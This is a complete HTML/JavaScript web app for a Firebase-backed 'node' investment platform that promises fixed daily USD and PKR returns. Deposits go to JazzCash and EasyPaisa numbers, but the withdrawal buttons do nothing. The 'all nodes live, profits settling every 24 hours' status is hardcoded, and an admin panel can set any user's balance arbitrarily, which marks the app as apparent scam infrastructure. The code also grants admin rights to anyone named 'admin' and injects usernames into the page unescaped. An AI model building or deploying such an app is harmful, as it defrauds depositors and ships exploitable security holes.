<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXA ULTIMATE | All-In-One Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        :root { --p: #2563EB; --dark: #070a13; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--dark); color: white; overflow-x: hidden; }
        .glass { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.05); border-radius: 24px; }
        .btn-grad { background: linear-gradient(135deg, #2563EB, #7C3AED); color: white; font-weight: 800; border-radius: 16px; transition: 0.3s; }
        .nav-icon { font-size: 20px; color: #64748b; cursor: pointer; transition: 0.3s; }
        .active-nav { color: #2563EB !important; transform: scale(1.2); }
        .hidden { display: none !important; }
        input { background: rgba(255,255,255,0.05) !important; border: 1px solid rgba(255,255,255,0.1) !important; color: white !important; }
    </style>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
        import { getDatabase, ref, set, get, update, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBe5Q5jXpx3UvrHC9WOky9UWeDnP9SPfZI",
            authDomain: "verbose-6c008.firebaseapp.com",
            databaseURL: "https://verbose-6c008-default-rtdb.firebaseio.com",
            projectId: "verbose-6c008",
            storageBucket: "verbose-6c008.firebasestorage.app",
            messagingSenderId: "867100945312",
            appId: "1:867100945312:web:315dfb48fb34496cee12c5"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getDatabase(app);

        let uData = null;
        let adminSettings = { jazz: "03705519562", easy: "03332637235" };

        window.connectTerminal = async () => {
            const user = document.getElementById('u-field').value;
            if(!user) return alert("Sweetie, enter username! 💋");
            try {
                const cred = await signInAnonymously(auth);
                const uid = cred.user.uid;
                const uRef = ref(db, 'users/' + uid);
                const snap = await get(uRef);
                
                if(!snap.exists()) {
                    await set(uRef, { username: user, balance: 5.0, pkr: 500, uid: uid, role: user.toLowerCase() === 'admin' ? 'admin' : 'user' });
                }
                localStorage.setItem('nexa_uid', uid);
                location.reload();
            } catch (e) { alert(e.message); }
        };

        window.onload = () => {
            const uid = localStorage.getItem('nexa_uid');
            if(uid) {
                document.getElementById('auth-screen').classList.add('hidden');
                document.getElementById('main-screen').classList.remove('hidden');
                syncTerminal(uid);
                renderNodes();
            }
        };

        function syncTerminal(uid) {
            onValue(ref(db, 'users/' + uid), (s) => {
                uData = s.val();
                document.getElementById('nav-user').innerText = uData.username;
                document.getElementById('header-usd').innerText = "$" + uData.balance.toFixed(2);
                document.getElementById('header-pkr').innerText = "Rs. " + uData.pkr;
                if(uData.role === 'admin') {
                    document.getElementById('admin-link').classList.remove('hidden');
                    loadAdminData();
                }
            });
            onValue(ref(db, 'admin/settings'), (s) => { if(s.exists()) adminSettings = s.val(); });
        }

        function loadAdminData() {
            onValue(ref(db, 'users'), (s) => {
                const users = s.val();
                const list = document.getElementById('admin-users-list');
                list.innerHTML = "";
                for(let id in users) {
                    list.innerHTML += `<div class="glass p-4 mb-3 flex justify-between items-center border-l-2 border-blue-500">
                        <div><p class="text-xs font-black uppercase tracking-tighter">${users[id].username}</p><p class="text-[9px] text-blue-400">$${users[id].balance} | Rs.${users[id].pkr}</p></div>
                        <button onclick="editBalance('${id}')" class="text-[10px] font-black bg-blue-600 px-3 py-1 rounded-lg">EDIT</button>
                    </div>`;
                }
            });
        }

        window.editBalance = (id) => {
            const type = prompt("Type 'usd' or 'pkr' to edit:");
            const amount = prompt("Enter New Amount:");
            if(type && amount) {
                const updateData = {};
                updateData[type === 'usd' ? 'balance' : 'pkr'] = parseFloat(amount);
                update(ref(db, 'users/' + id), updateData);
            }
        };

        window.saveAdminSettings = () => {
            const j = document.getElementById('adm-jazz').value;
            const e = document.getElementById('adm-easy').value;
            update(ref(db, 'admin/settings'), { jazz: j, easy: e });
            alert("Settings Saved Sweetie! 💋");
        };

        function renderNodes() {
            const grid = document.getElementById('nodes-grid');
            grid.innerHTML = "";
            for(let i=1; i<=15; i++) {
                grid.innerHTML += `<div class="glass p-5 mb-4 border-b-2 border-blue-600/20">
                    <div class="flex justify-between font-black mb-3"><span class="text-[10px] text-blue-400">USD NODE v.${i}</span><span>$${i*10}</span></div>
                    <div class="flex justify-between text-[9px] font-bold text-slate-500 uppercase mb-4"><span>Daily:$${(i*0.9).toFixed(2)}</span><span>Term: 360D</span></div>
                    <button onclick="buyNode(${i*10}, 'usd')" class="w-full btn-grad py-3 text-[10px]">INITIALIZE NODE</button>
                </div>`;
            }
            for(let i=1; i<=15; i++) {
                grid.innerHTML += `<div class="glass p-5 mb-4 border-b-2 border-yellow-600/20">
                    <div class="flex justify-between font-black mb-3"><span class="text-[10px] text-yellow-400">PKR NODE v.${i}</span><span>Rs. ${i*500}</span></div>
                    <div class="flex justify-between text-[9px] font-bold text-slate-500 uppercase mb-4"><span>Daily: Rs.${i*40}</span><span>Term: 360D</span></div>
                    <button onclick="buyNode(${i*500}, 'pkr')" class="w-full bg-yellow-500 text-black font-black py-3 rounded-2xl text-[10px]">INITIALIZE NODE</button>
                </div>`;
            }
        }

        window.buyNode = (price, type) => {
            const bal = type === 'usd' ? uData.balance : uData.pkr;
            if(bal < price) { alert("Insufficient Balance! Deposit sweetie. 💋"); switchTab('wallet'); }
            else { alert("Deployment in progress..."); }
        };

        window.openPay = (method) => {
            const num = method === 'jazz' ? adminSettings.jazz : adminSettings.easy;
            const tid = prompt(`DEPOSIT ${method.toUpperCase()}\nSend to: ${num}\n\nEnter Trx ID:`);
            if(tid) alert("Request Sent! Pending Approval.");
        };

        window.switchTab = (t) => {
            ['home', 'mine', 'wallet', 'admin'].forEach(id => document.getElementById('sec-'+id).classList.add('hidden'));
            document.getElementById('sec-'+t).classList.remove('hidden');
            document.querySelectorAll('.nav-icon').forEach(n => n.classList.remove('active-nav'));
            event.currentTarget.classList.add('active-nav');
        };
    </script>
</head>
<body class="pb-28">

    <div id="auth-screen" class="fixed inset-0 bg-[#070a13] z-[9999] flex flex-col justify-center p-10">
        <div class="text-center mb-10"><i class="fa-solid fa-atom text-blue-600 text-6xl mb-4 animate-spin-slow"></i><h1 class="text-3xl font-black italic tracking-tighter">NEXA COMMAND</h1></div>
        <input id="u-field" type="text" placeholder="Identity Code" class="w-full p-5 rounded-2xl mb-4 outline-none font-bold text-center">
        <button onclick="connectTerminal()" class="w-full btn-grad py-5 text-xs uppercase tracking-widest">Connect Session</button>
    </div>

    <div id="main-screen" class="hidden">
        <header class="p-6 sticky top-0 bg-[#070a13]/80 backdrop-blur-md border-b border-white/5 z-50 flex justify-between items-center">
            <div class="flex items-center gap-3">
                <div class="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center text-white"><i class="fa-solid fa-fingerprint"></i></div>
                <h2 id="nav-user" class="text-sm font-black italic uppercase">...</h2>
            </div>
            <div class="text-right">
                <p id="header-usd" class="text-blue-500 font-black">$0.00</p>
                <p id="header-pkr" class="text-[9px] font-bold text-slate-500">Rs. 0</p>
            </div>
        </header>

        <main class="p-5">
            <div id="sec-home" class="space-y-6">
                <div class="glass p-8 bg-gradient-to-br from-blue-900/40 to-transparent">
                    <h1 class="text-4xl font-black italic leading-none mb-4">Master<br>Control.</h1>
                    <p class="text-[11px] font-bold text-slate-400 mb-8">System status: All 30 nodes live. Profits settling every 24 hours.</p>
                    <button onclick="switchTab('mine')" class="btn-grad px-10 py-4 text-[10px] uppercase">Nodes List</button>
                </div>
            </div>

            <div id="sec-mine" class="hidden">
                <h3 class="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-6">Quantum Infrastructure</h3>
                <div id="nodes-grid"></div>
            </div>

            <div id="sec-wallet" class="hidden space-y-6">
                <div class="glass p-10 text-center bg-gradient-to-t from-blue-600/10 to-transparent">
                    <p class="text-[10px] font-black text-slate-500 uppercase mb-2">Portfolio Balance</p>
                    <h1 class="text-5xl font-black">$0.00</h1>
                    <div class="grid grid-cols-2 gap-4 mt-8">
                        <button onclick="openPay('jazz')" class="btn-grad py-4 text-[10px]">DEPOSIT</button>
                        <button class="bg-white/5 py-4 rounded-xl font-black text-[10px]">WITHDRAW</button>
                    </div>
                </div>
                <div class="glass p-8">
                    <h3 class="text-xs font-black uppercase mb-4 italic">Cashout Request</h3>
                    <input type="text" placeholder="Account Number" class="w-full p-4 rounded-xl mb-3 text-xs font-bold">
                    <input type="number" placeholder="Amount" class="w-full p-4 rounded-xl mb-4 text-xs font-bold">
                    <button class="w-full btn-grad py-4 text-xs font-black">Submit Withdrawal</button>
                </div>
            </div>

            <div id="sec-admin" class="hidden space-y-6">
                <div class="glass p-6 border-l-4 border-red-500">
                    <h2 class="text-xl font-black italic text-red-500">Administration Panel</h2>
                    <p class="text-[10px] font-bold opacity-60 uppercase">Full System Override Active</p>
                </div>
                <h3 class="text-xs font-black uppercase text-slate-500">Live User Control</h3>
                <div id="admin-users-list"></div>
                <div class="glass p-6">
                    <h3 class="text-xs font-black uppercase mb-4">Gateway Settings</h3>
                    <input id="adm-jazz" type="text" placeholder="JazzCash Number" class="w-full p-4 rounded-xl mb-3 text-xs font-bold">
                    <input id="adm-easy" type="text" placeholder="EasyPaisa Number" class="w-full p-4 rounded-xl mb-4 text-xs font-bold">
                    <button onclick="saveAdminSettings()" class="w-full btn-grad py-4 text-xs">Save Settings</button>
                </div>
                <button onclick="localStorage.clear(); location.reload();" class="w-full bg-red-600/20 text-red-500 py-4 rounded-xl text-xs font-black mt-10">EXIT SYSTEM</button>
            </div>
        </main>

        <nav class="fixed bottom-6 left-6 right-6 h-20 glass rounded-[2.5rem] flex justify-around items-center px-4 z-[1000] border-t border-white/10 shadow-2xl">
            <button onclick="switchTab('home')" class="nav-icon active-nav"><i class="fa-solid fa-bolt"></i></button>
            <button onclick="switchTab('mine')" class="nav-icon"><i class="fa-solid fa-server"></i></button>
            <button onclick="switchTab('wallet')" class="nav-icon"><i class="fa-solid fa-wallet"></i></button>
            <button id="admin-link" onclick="switchTab('admin')" class="nav-icon hidden text-red-500"><i class="fa-solid fa-user-secret"></i></button>
        </nav>
    </div>

</body>
</html>
